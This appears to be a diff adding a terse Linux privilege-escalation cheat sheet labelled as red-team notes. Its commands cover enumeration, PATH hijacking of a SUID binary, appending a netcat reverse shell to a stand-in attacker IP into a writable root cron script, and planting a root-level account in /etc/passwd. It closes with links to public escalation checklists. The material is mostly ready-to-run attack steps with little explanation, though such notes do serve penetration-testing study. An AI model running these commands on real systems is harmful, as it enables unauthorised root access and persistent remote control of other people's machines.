@@ -1,0 +1,36 @@
+Linux Privilege Escalation - Technical Reference Guide 
+
+# [1] ENUMERATION
+whoami && id
+sudo -l
+cat /etc/passwd | cut -d: -f1
+find / -perm -u=s -type f 2>/dev/null
+
+# [2] PATH HIJACKING (SUID)
+# Execution:
+cd /tmp
+echo "/bin/bash" > ls
+chmod +x ls
+export PATH=$(pwd):$PATH
+# Now run the SUID binary that calls 'ls'
+
+# [3] CRON JOBS EXPLOITATION
+# Check for writable root scripts:
+cat /etc/crontab
+ls -la /path/to/script.sh
+echo "nc -e /bin/bash [ATTACKER_IP] [PORT]" >> /path/to/script.sh
+
+# [4] /ETC/PASSWD POISONING
+# Generate password hash:
+openssl passwd -1 -salt user password123
+# If writable, append this line:
+# hacker:$1$user$L9y.S.6...:0:0:root:/root:/bin/bash
+
+# [5] EXTERNAL RESOURCES & CHECKLISTS
+* GTFOBins: https://gtfobins.github.io/
+* PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+* Linux Checklist (netbiosX): https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+* OSCP Guide: https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+
+---
+*Verified for Red Team Notes - May 2026*
